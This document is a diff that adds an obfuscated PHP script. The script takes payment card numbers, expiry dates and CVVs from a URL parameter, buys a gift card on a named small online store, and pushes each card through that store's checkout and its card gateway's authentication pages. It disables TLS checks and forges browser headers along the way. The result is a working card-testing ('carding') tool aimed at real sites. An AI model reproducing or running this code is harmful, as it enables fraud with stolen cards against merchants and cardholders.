@@ -1,0 +1,527 @@
+<?php
+
+$GLOBALS["ueplvovhv"] = "errorCode";
+$GLOBALS["glohqont"] = "OriginalResponseCode";
+$GLOBALS["lrskmnrd"] = "ReasonCodeDesc";
+$GLOBALS["ibumminny"] = "__EVENTVALIDATION";
+$GLOBALS["djclmppsbg"] = "__VIEWSTATE";
+$GLOBALS["jtfisub"] = "inputFields";
+$GLOBALS["pcoisl"] = "queryString";
+$GLOBALS["ighkytbcm"] = "__VIEWSTATEGENERATOR";
+$GLOBALS["iniuiun"] = "name";
+$GLOBALS["nqjuawelodr"] = "value";
+$GLOBALS["ujtpnf"] = "match";
+$GLOBALS["plyftqsohkn"] = "matches";
+$GLOBALS["aqtvcqoucbjk"] = "redirect_url";
+$GLOBALS["xoishzu"] = "response_data";
+$GLOBALS["brckihvfhm"] = "ch";
+$GLOBALS["mwdplf"] = "response";
+$GLOBALS["jhxpcrxn"] = "headers";
+$GLOBALS["intijhinxvv"] = "headers";
+$hvuvfipeoqf = "headers";
+$GLOBALS["muggyyvx"] = "ch";
+$eexvwhw = "headers";
+$GLOBALS["imoupmrcs"] = "a";
+$stmomvpflk = "ch";
+$pemhkskdtg = "headers";
+$GLOBALS["npdkbybtk"] = "b";
+$GLOBALS["veyjffef"] = "cookie";
+$GLOBALS["yyunaoph"] = "form_key";
+$GLOBALS["ulreavkye"] = "cc3";
+$pzeievrqtowo = "errorCode";
+$ybhfcr = "ch";
+$GLOBALS["yujlosjygpig"] = "cc2";
+$erohvwbtbhrn = "cookie";
+$GLOBALS["wmvteietzqn"] = "cc1";
+$dzensd = "cc";
+$GLOBALS["vdohfg"] = "headers";
+$GLOBALS["jzyenxtn"] = "yy";
+$sjaioiyobd = "headers";
+$GLOBALS["irmtnqm"] = "mm";
+$GLOBALS["armgpbo"] = "headers";
+$GLOBALS["orgjjq"] = "response";
+$uieaytvwigo = "errorCode";
+$GLOBALS["rbkuxqvxirl"] = "m";
+$GLOBALS["wxlvsjuvj"] = "bin";
+$GLOBALS["hhygii"] = "headers";
+$GLOBALS["sihjuqkkscs"] = "last4";
+$GLOBALS["emlsoqmojva"] = "ch";
+$izxpktulmjmm = "cookie";
+$GLOBALS["hrmdpxupayi"] = "ch";
+$kjolpirllnoj = "errorCode";
+$GLOBALS["erteezywd"] = "ch";
+$GLOBALS["kqcxsn"] = "lista";
+$GLOBALS["bdbddfrvkmve"] = "ch";
+$GLOBALS["uokcogg"] = "headers";
+$fsfsateyiyd = "cc";
+$uwtdcysp = "headers";
+$zywgrvop = "response";
+$GLOBALS["zuzrwnmsxn"] = "cvv";
+$qnvrfmtjhb = "headers";
+$GLOBALS["hkyocyj"] = "yyyy";
+$ssqvihoxmqw = "__EVENTVALIDATION";
+$fbnaeqgegej = "isDir";
+$frsketerx = "headers";
+$GLOBALS["jvjecllsg"] = "cc";
+$fbliuvvmi = "mm";
+$GLOBALS["niihoxviwywl"] = "ch";
+$GLOBALS["yxrlmstzgohw"] = "cc";
+$lebaamnxxk = "response";
+$GLOBALS["utetzaf"] = "last4";
+$speihok = "ch";
+echo "\n";
+$ffwcjdqceicl = "headers";
+$GLOBALS["pwvhgl"] = "cookie";
+error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE & ~E_DEPRECATED);
+$GLOBALS["elmjneufrd"] = "cookie";
+$ewhnoyrtijup = "ch";
+$mqqkzmjeq = "errorCode";
+list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace("/[^0-9|]+/", "", $_GET["lista"]));
+$GLOBALS["hbtubgxj"] = "headers";
+$GLOBALS["husdzrgkvygu"] = "headers";
+$GLOBALS["molyee"] = "ch";
+$ykjpylcj = "ch";
+$xkojtbjedgt = "ch";
+$lista = "{$cc}|{$mm}|{$yyyy}|{$cvv}";
+$GLOBALS["byuefctun"] = "ch";
+$bin = substr($cc, 0, 6);
+$deloeqycntfc = "ch";
+$GLOBALS["xifqaqxkpe"] = "headers";
+$last4 = substr($cc, 12, 16);
+$GLOBALS["vdlwqvuces"] = "cc4";
+$m = ltrim($mm, "0");
+$GLOBALS["olruwssk"] = "ch";
+$yy = substr($yyyy, 2, 4);
+$uvpdkdqr = "ch";
+$last4 = substr($cc, -4);
+$cc1 = substr($cc, 0, 4);
+$cc2 = substr($cc, 4, 4);
+$pxgfsslmr = "ch";
+$cc3 = substr($cc, 8, 4);
+$GLOBALS["bekhjkcamp"] = "ch";
+$cc4 = substr($cc, 12, 4);
+$form_key = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 16);
+$GLOBALS["dosmbgusd"] = "inputFields";
+$isDir = is_dir("cookie") ?: mkdir("cookie");
+$iqmyfitlu = "ch";
+$eejxwewgg = "ch";
+$GLOBALS["ptgmjvrejln"] = "ch";
+$GLOBALS["vkquvrjefmb"] = "headers";
+$GLOBALS["irojgtcrty"] = "ch";
+$GLOBALS["omkplyfv"] = "headers";
+$cookie = [getcwd() . "/cookie/razcute_" . mt_rand() . rand() . ".txt"];
+$GLOBALS["frhuuio"] = "ch";
+function parse($a, $b, $c)
+{
+    $GLOBALS["ggnjgbqxsgno"] = "c";
+    return explode($c, explode($b, $a)[1])[0];
+}
+$klcpfgw = "headers";
+$ch = curl_init();
+$xxjbppyg = "match";
+curl_setopt($ch, CURLOPT_URL, "https://roastbybresheh.com/product/roast-giftcard/");
+$GLOBALS["hthnhdhosg"] = "headers";
+$ndqlzp = "errorCode";
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie[0]);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie[0]);
+curl_setopt($ch, CURLOPT_POST, 1);
+$GLOBALS["obdylrwntcua"] = "ch";
+$GLOBALS["hokdfweouuyk"] = "headers";
+curl_setopt($ch, CURLOPT_POSTFIELDS, "------WebKitFormBoundaryy06uDYiSwI6Ly8sU\nContent-Disposition: form-data; name=\"attribute_gift-card-amount\"\n\nOther amount\n------WebKitFormBoundaryy06uDYiSwI6Ly8sU\nContent-Disposition: form-data; name=\"pw_gift_cards_custom_amount\"\n\n5,000.00\n------WebKitFormBoundaryy06uDYiSwI6Ly8sU\nContent-Disposition: form-data; name=\"pw_gift_card_to\"\n\nczxzxcasd@gmail.com\n------WebKitFormBoundaryy06uDYiSwI6Ly8sU\nContent-Disposition: form-data; name=\"pw_gift_card_from\"\n\nczxzxcasd@gmail.com\n------WebKitFormBoundaryy06uDYiSwI6Ly8sU\nContent-Disposition: form-data; name=\"pw_gift_card_message\"\n\n\n------WebKitFormBoundaryy06uDYiSwI6Ly8sU\nContent-Disposition: form-data; name=\"pw_gift_card_delivery_date\"\n\n2023-09-29\n------WebKitFormBoundaryy06uDYiSwI6Ly8sU\nContent-Disposition: form-data; name=\"pw_gift_card_email_design_id\"\n\n0\n------WebKitFormBoundaryy06uDYiSwI6Ly8sU\nContent-Disposition: form-data; name=\"quantity\"\n\n1\n------WebKitFormBoundaryy06uDYiSwI6Ly8sU\nContent-Disposition: form-data; name=\"add-to-cart\"\n\n3489\n------WebKitFormBoundaryy06uDYiSwI6Ly8sU\nContent-Disposition: form-data; name=\"product_id\"\n\n3489\n------WebKitFormBoundaryy06uDYiSwI6Ly8sU\nContent-Disposition: form-data; name=\"variation_id\"\n\n3511\n------WebKitFormBoundaryy06uDYiSwI6Ly8sU--");
+$piypybsxs = "headers";
+$qiblbtela = "headers";
+$abzueer = "checkoutnonce";
+$GLOBALS["rfxwdcelwi"] = "headers";
+$GLOBALS["svdhsmryu"] = "cookie";
+$headers = array();
+$headers[] = "Authority: roastbybresheh.com";
+$ihowtwltecs = "headers";
+$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+$GLOBALS["lappgalhs"] = "ch";
+$headers[] = "Accept-Language: en-US,en;q=0.9";
+$GLOBALS["nssrquipxk"] = "headers";
+$GLOBALS["bucxsxc"] = "ch";
+$headers[] = "Cache-Control: max-age=0";
+$GLOBALS["cyjkgco"] = "headers";
+$GLOBALS["rcebkgxyovm"] = "headers";
+$headers[] = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy06uDYiSwI6Ly8sU";
+$headers[] = "Origin: https://roastbybresheh.com";
+$headers[] = "Referer: https://roastbybresheh.com/product/roast-giftcard/";
+$lhwofapwe = "ch";
+$headers[] = "Sec-Ch-Ua: \\\"Google Chrome\\\";v=\\\"117\\\", \\\"Not;A=Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"117\\\"";
+$GLOBALS["tsqkqndt"] = "ch";
+$headers[] = "Sec-Ch-Ua-Mobile: ?0";
+$GLOBALS["ckqcqlxh"] = "headers";
+$GLOBALS["yshocctykd"] = "ch";
+$headers[] = "Sec-Ch-Ua-Platform: \\\"Windows\\\"";
+$GLOBALS["boepgvhctt"] = "ch";
+$headers[] = "Sec-Fetch-Dest: document";
+$headers[] = "Sec-Fetch-Mode: navigate";
+$GLOBALS["msqslvvwevey"] = "ch";
+$headers[] = "Sec-Fetch-Site: same-origin";
+$headers[] = "Sec-Fetch-User: ?1";
+$headers[] = "Upgrade-Insecure-Requests: 1";
+$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";
+$GLOBALS["hexciljjc"] = "ch";
+$GLOBALS["reedgdw"] = "ch";
+$GLOBALS["dhsxuyiy"] = "headers";
+$GLOBALS["jiwrvdcjvxd"] = "headers";
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+$nndknlvv = "ch";
+$response = curl_exec($ch);
+curl_close($ch);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://roastbybresheh.com/checkout");
+$hxfmpjdk = "headers";
+$plxcujcwoz = "queryString";
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+$GLOBALS["ruxuerbaf"] = "headers";
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie[0]);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie[0]);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
+$lbhqqr = "headers";
+$GLOBALS["tufthhbnf"] = "queryString";
+$headers = array();
+$mtmgsuto = "cookie";
+$kdoscgo = "errorCode";
+$rpdwwbmmcwo = "ch";
+$headers[] = "Authority: roastbybresheh.com";
+$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+$uowfldma = "errorCode";
+$headers[] = "Accept-Language: en-US,en;q=0.9";
+$GLOBALS["oqchhpfhpv"] = "ch";
+$headers[] = "Sec-Ch-Ua: \\\"Google Chrome\\\";v=\\\"117\\\", \\\"Not;A=Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"117\\\"";
+$headers[] = "Sec-Ch-Ua-Mobile: ?0";
+$ztlfwtjt = "headers";
+$headers[] = "Sec-Ch-Ua-Platform: \\\"Windows\\\"";
+$wihldibqeofl = "headers";
+$GLOBALS["rdvekguym"] = "response";
+$GLOBALS["opipniis"] = "headers";
+$headers[] = "Sec-Fetch-Dest: document";
+$headers[] = "Sec-Fetch-Mode: navigate";
+$headers[] = "Sec-Fetch-Site: none";
+$headers[] = "Sec-Fetch-User: ?1";
+$GLOBALS["wsqzrdp"] = "errorCode";
+$headers[] = "Upgrade-Insecure-Requests: 1";
+$GLOBALS["cmxkdk"] = "ch";
+$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";
+$qncmhxss = "queryString";
+$GLOBALS["bpjqmbvaqjd"] = "ch";
+$GLOBALS["qccqquncwtya"] = "ch";
+$hnebojmcovk = "headers";
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+$response = curl_exec($ch);
+$checkoutnonce = parse($response, "name=\"woocommerce-process-checkout-nonce\" value=\"", "\"");
+curl_close($ch);
+$GLOBALS["vtwkkojqaw"] = "cvv";
+$ch = curl_init();
+$iocpomllde = "inputFields";
+$GLOBALS["qsykmhnlow"] = "headers";
+curl_setopt($ch, CURLOPT_URL, "https://roastbybresheh.com/?wc-ajax=checkout");
+$iplrygyxxr = "ch";
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+$GLOBALS["kvvnmojt"] = "headers";
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie[0]);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie[0]);
+$GLOBALS["prhnqclofqsd"] = "errorCode";
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "billing_first_name=USA&billing_last_name=USA&billing_company=&billing_country=US&billing_address_1=8900+Viscount+Blvd+%23Ah&billing_address_2=&billing_city=El+Paso&billing_state=TX&billing_postcode=79925&billing_phone=9155941969&billing_email=usatexas%40gmail.com&order_comments=&payment_method=wcfac&wcfac-card-number={$cc}&wcfac-card-expiry={$mm}+%2F+{$yy}&wcfac-card-cvc=123&isitnewcard=new&woocommerce-process-checkout-nonce={$checkoutnonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined&pys_browser_time=21-22%7CMonday%7CSeptember&pys_landing=https%3A%2F%2Froastbybresheh.com%2F&pys_source=direct&pys_order_type=normal&last_pys_landing=https%3A%2F%2Froastbybresheh.com%2F&last_pys_source=direct&last_pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&last_pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined");
+$headers = array();
+$headers[] = "Authority: roastbybresheh.com";
+$GLOBALS["sulkigjueuv"] = "ch";
+$GLOBALS["mpyqjuorlfg"] = "headers";
+$headers[] = "Accept: application/json, text/javascript, */*; q=0.01";
+$headers[] = "Accept-Language: en-US,en;q=0.9";
+$headers[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
+$headers[] = "Origin: https://roastbybresheh.com";
+$headers[] = "Referer: https://roastbybresheh.com/checkout/?reason_code=2";
+$nyrfvlykkp = "response";
+$sdajdrkdjos = "headers";
+$rhngchwbxn = "response";
+$headers[] = "Sec-Ch-Ua: \\\"Google Chrome\\\";v=\\\"117\\\", \\\"Not;A=Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"117\\\"";
+$GLOBALS["cwjdsoqm"] = "response_data";
+$headers[] = "Sec-Ch-Ua-Mobile: ?0";
+$headers[] = "Sec-Ch-Ua-Platform: \\\"Windows\\\"";
+$headers[] = "Sec-Fetch-Dest: empty";
+$headers[] = "Sec-Fetch-Mode: cors";
+$GLOBALS["qjoiurmrhip"] = "OriginalResponseCode";
+$headers[] = "Sec-Fetch-Site: same-origin";
+$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";
+$rutxkpig = "ch";
+$headers[] = "X-Requested-With: XMLHttpRequest";
+$efxlvvue = "headers";
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+$response = curl_exec($ch);
+$response_data = json_decode($response, true);
+$GLOBALS["uryfshok"] = "headers";
+if (isset($response_data["redirect"])) {
+    $GLOBALS["ujfjist"] = "response_data";
+    $hbcvfrh = "redirect_url";
+    $redirect_url = $response_data["redirect"];
+    "Redirect URL: " . $redirect_url;
+} else {
+    die("Redirect key not found in the response.");
+}
+curl_close(${$GLOBALS["qccqquncwtya"]});
+${$GLOBALS["frhuuio"]} = curl_init();
+$GLOBALS["uunjsdmuw"] = "ch";
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_URL, ${$GLOBALS["aqtvcqoucbjk"]});
+$GLOBALS["yvnnxg"] = "errorCode";
+curl_setopt(${$pxgfsslmr}, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt(${$rutxkpig}, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt(${$GLOBALS["obdylrwntcua"]}, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt(${$speihok}, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt(${$GLOBALS["bekhjkcamp"]}, CURLOPT_COOKIEJAR, ${$izxpktulmjmm}[0]);
+curl_setopt(${$GLOBALS["yshocctykd"]}, CURLOPT_COOKIEFILE, ${$GLOBALS["veyjffef"]}[0]);
+$erijsyg = "ch";
+$GLOBALS["rvjjaoddr"] = "headers";
+$GLOBALS["rptlkeof"] = "response";
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_CUSTOMREQUEST, "GET");
+${$GLOBALS["jhxpcrxn"]} = array();
+$GLOBALS["bvkbrqyybcb"] = "errorCode";
+${$GLOBALS["omkplyfv"]}[] = "Authority: roastbybresheh.com";
+${$GLOBALS["jhxpcrxn"]}[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+${$GLOBALS["rvjjaoddr"]}[] = "Accept-Language: en-US,en;q=0.9";
+${$GLOBALS["jhxpcrxn"]}[] = "Referer: https://roastbybresheh.com/checkout/?reason_code=2";
+${$GLOBALS["uryfshok"]}[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";
+curl_setopt(${$GLOBALS["lappgalhs"]}, CURLOPT_HTTPHEADER, ${$GLOBALS["jhxpcrxn"]});
+${$GLOBALS["mwdplf"]} = curl_exec(${$iplrygyxxr});
+${$GLOBALS["dosmbgusd"]} = array();
+$xdaieife = "ch";
+preg_match_all("/<input[^>]+name=\"([^\"]+)\"[^>]+value=\"([^\"]+)\"/i", ${$GLOBALS["rptlkeof"]}, ${$GLOBALS["plyftqsohkn"]}, PREG_SET_ORDER);
+if (empty(${$GLOBALS["plyftqsohkn"]})) {
+    die("No input fields found in the HTML.");
+}
+foreach (${$GLOBALS["plyftqsohkn"]} as ${$GLOBALS["ujtpnf"]}) {
+    $dhnrvxnnqkr = "name";
+    $name = ${$GLOBALS["ujtpnf"]}[1];
+    $isizwpjofn = "name";
+    ${$GLOBALS["nqjuawelodr"]} = ${$GLOBALS["ujtpnf"]}[2];
+    $GLOBALS["owgoxe"] = "inputFields";
+    if (${$GLOBALS["iniuiun"]} === "CardCVV2") {
+        continue;
+    }
+    ${$GLOBALS["owgoxe"]}[${$isizwpjofn}] = ${$GLOBALS["nqjuawelodr"]};
+}
+${$GLOBALS["pcoisl"]} = http_build_query(${$GLOBALS["jtfisub"]});
+$hozuriqanfe = "headers";
+if (!empty(${$GLOBALS["vtwkkojqaw"]})) {
+    ${$GLOBALS["pcoisl"]} .= "&CardCVV2=" . urlencode(${$GLOBALS["zuzrwnmsxn"]});
+}
+curl_close(${$GLOBALS["uunjsdmuw"]});
+$GLOBALS["gjtdvhv"] = "headers";
+${$GLOBALS["muggyyvx"]} = curl_init();
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_URL, "https://marlin.firstatlanticcommerce.com/SENTRY/PaymentGateway/Application/DirectAuthLink.aspx");
+$GLOBALS["fmxhdr"] = "ch";
+curl_setopt(${$GLOBALS["hexciljjc"]}, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt(${$GLOBALS["byuefctun"]}, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_COOKIEJAR, ${$GLOBALS["veyjffef"]}[0]);
+curl_setopt(${$rpdwwbmmcwo}, CURLOPT_COOKIEFILE, ${$GLOBALS["svdhsmryu"]}[0]);
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_POST, 1);
+$tnzmlekmutwj = "headers";
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_POSTFIELDS, ${$plxcujcwoz});
+$GLOBALS["xndygpdcgri"] = "headers";
+${$GLOBALS["husdzrgkvygu"]} = array();
+${$GLOBALS["jhxpcrxn"]}[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+$yvxnswk = "headers";
+${$GLOBALS["uokcogg"]}[] = "Accept-Language: en-US,en;q=0.9";
+${$GLOBALS["jhxpcrxn"]}[] = "Cache-Control: max-age=0";
+${$klcpfgw}[] = "Connection: keep-alive";
+${$GLOBALS["jhxpcrxn"]}[] = "Content-Type: application/x-www-form-urlencoded";
+${$GLOBALS["jhxpcrxn"]}[] = "Origin: https://roastbybresheh.com";
+${$GLOBALS["hokdfweouuyk"]}[] = "Referer: https://roastbybresheh.com/";
+${$GLOBALS["jhxpcrxn"]}[] = "Sec-Fetch-Dest: document";
+${$GLOBALS["jhxpcrxn"]}[] = "Sec-Fetch-Mode: navigate";
+${$GLOBALS["jhxpcrxn"]}[] = "Sec-Fetch-Site: cross-site";
+${$hnebojmcovk}[] = "Upgrade-Insecure-Requests: 1";
+$GLOBALS["lgtqqnzhrd"] = "ch";
+${$GLOBALS["jhxpcrxn"]}[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";
+${$efxlvvue}[] = "Sec-Ch-Ua: \\\"Google Chrome\\\";v=\\\"117\\\", \\\"Not;A=Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"117\\\"";
+${$hvuvfipeoqf}[] = "Sec-Ch-Ua-Mobile: ?0";
+${$GLOBALS["mpyqjuorlfg"]}[] = "Sec-Ch-Ua-Platform: \\\"Windows\\\"";
+curl_setopt(${$erijsyg}, CURLOPT_HTTPHEADER, ${$frsketerx});
+${$GLOBALS["orgjjq"]} = curl_exec(${$GLOBALS["irojgtcrty"]});
+${$iocpomllde} = array();
+preg_match_all("/name=[\"']([^\"']+)[\"'][^>]+value=[\"']([^\"']+)[\"']/i", ${$rhngchwbxn}, ${$GLOBALS["plyftqsohkn"]}, PREG_SET_ORDER);
+if (empty(${$GLOBALS["plyftqsohkn"]})) {
+    die("No input fields found in the HTML.");
+}
+foreach (${$GLOBALS["plyftqsohkn"]} as ${$xxjbppyg}) {
+    $vsburxlodxuq = "match";
+    $GLOBALS["omypuxya"] = "value";
+    $iwkmubcitgig = "match";
+    $dlpcvkmy = "name";
+    $name = $match[1];
+    $value = $match[2];
+    ${$GLOBALS["jtfisub"]}[${$GLOBALS["iniuiun"]}] = ${$GLOBALS["nqjuawelodr"]};
+}
+${$qncmhxss} = http_build_query(${$GLOBALS["jtfisub"]});
+curl_close(${$GLOBALS["muggyyvx"]});
+${$GLOBALS["muggyyvx"]} = curl_init();
+curl_setopt(${$GLOBALS["oqchhpfhpv"]}, CURLOPT_URL, "https://marlin.firstatlanticcommerce.com/SENTRY/PaymentGateway/Application/WFrmAuthenticate.aspx");
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt(${$stmomvpflk}, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt(${$GLOBALS["fmxhdr"]}, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt(${$GLOBALS["lgtqqnzhrd"]}, CURLOPT_COOKIEJAR, ${$GLOBALS["veyjffef"]}[0]);
+curl_setopt(${$GLOBALS["bpjqmbvaqjd"]}, CURLOPT_COOKIEFILE, ${$mtmgsuto}[0]);
+curl_setopt(${$GLOBALS["boepgvhctt"]}, CURLOPT_POST, 1);
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_POSTFIELDS, ${$GLOBALS["tufthhbnf"]});
+${$wihldibqeofl} = array();
+$iwxclthclqt = "ch";
+${$GLOBALS["jhxpcrxn"]}[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+${$GLOBALS["jhxpcrxn"]}[] = "Accept-Language: en-US,en;q=0.9";
+${$GLOBALS["xifqaqxkpe"]}[] = "Cache-Control: max-age=0";
+$GLOBALS["fjcpyuqotm"] = "response";
+${$GLOBALS["jhxpcrxn"]}[] = "Connection: keep-alive";
+${$GLOBALS["jhxpcrxn"]}[] = "Content-Type: application/x-www-form-urlencoded";
+${$tnzmlekmutwj}[] = "Origin: https://marlin.firstatlanticcommerce.com";
+${$sjaioiyobd}[] = "Referer: https://marlin.firstatlanticcommerce.com/SENTRY/PaymentGateway/Application/DirectAuthLink.aspx";
+${$hxfmpjdk}[] = "Sec-Fetch-Dest: document";
+${$GLOBALS["jhxpcrxn"]}[] = "Sec-Fetch-Mode: navigate";
+${$GLOBALS["jhxpcrxn"]}[] = "Sec-Fetch-Site: same-origin";
+${$GLOBALS["jhxpcrxn"]}[] = "Upgrade-Insecure-Requests: 1";
+${$GLOBALS["jiwrvdcjvxd"]}[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";
+$ykipahcwb = "__VIEWSTATE";
+${$GLOBALS["jhxpcrxn"]}[] = "Sec-Ch-Ua: \\\"Google Chrome\\\";v=\\\"117\\\", \\\"Not;A=Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"117\\\"";
+${$GLOBALS["xndygpdcgri"]}[] = "Sec-Ch-Ua-Mobile: ?0";
+${$GLOBALS["jhxpcrxn"]}[] = "Sec-Ch-Ua-Platform: \\\"Windows\\\"";
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_HTTPHEADER, ${$GLOBALS["jhxpcrxn"]});
+${$GLOBALS["fjcpyuqotm"]} = curl_exec(${$GLOBALS["muggyyvx"]});
+${$ykipahcwb} = parse(${$GLOBALS["mwdplf"]}, "id=\"__VIEWSTATE\" value=\"", "\"");
+${$GLOBALS["ighkytbcm"]} = parse(${$GLOBALS["mwdplf"]}, "id=\"__VIEWSTATEGENERATOR\" value=\"", "\"");
+$ibvljwgn = "errorCode";
+${$ssqvihoxmqw} = parse(${$GLOBALS["mwdplf"]}, "id=\"__EVENTVALIDATION\" value=\"", "\"");
+$sid = parse(${$GLOBALS["rdvekguym"]}, "id=\"sid\" value=\"", "\"");
+curl_close(${$GLOBALS["muggyyvx"]});
+$symrggnc = "ch";
+${$GLOBALS["niihoxviwywl"]} = curl_init();
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_URL, "https://marlin.firstatlanticcommerce.com/SENTRY/PaymentGateway/Application/WFrmAuthenticate.aspx");
+curl_setopt(${$GLOBALS["ptgmjvrejln"]}, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt(${$GLOBALS["muggyyvx"]}, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt(${$symrggnc}, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt(${$iqmyfitlu}, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt(${$xdaieife}, CURLOPT_COOKIEJAR, ${$GLOBALS["veyjffef"]}[0]);
+curl_setopt(${$GLOBALS["sulkigjueuv"]}, CURLOPT_COOKIEFILE, ${$GLOBALS["veyjffef"]}[0]);
+curl_setopt(${$ewhnoyrtijup}, CURLOPT_POST, 1);
+curl_setopt(${$GLOBALS["bucxsxc"]}, CURLOPT_POSTFIELDS, "__VIEWSTATE=" . urlencode(${$GLOBALS["djclmppsbg"]}) . "&__VIEWSTATEGENERATOR={$__VIEWSTATEGENERATOR}&__EVENTVALIDATION=" . urlencode(${$GLOBALS["ibumminny"]}) . "&sid=" . $sid);
+${$GLOBALS["qsykmhnlow"]} = array();
+${$uwtdcysp}[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+${$ffwcjdqceicl}[] = "Accept-Language: en-US,en;q=0.9";
+${$GLOBALS["gjtdvhv"]}[] = "Cache-Control: max-age=0";
+${$GLOBALS["jhxpcrxn"]}[] = "Connection: keep-alive";
+${$hozuriqanfe}[] = "Content-Type: application/x-www-form-urlencoded";
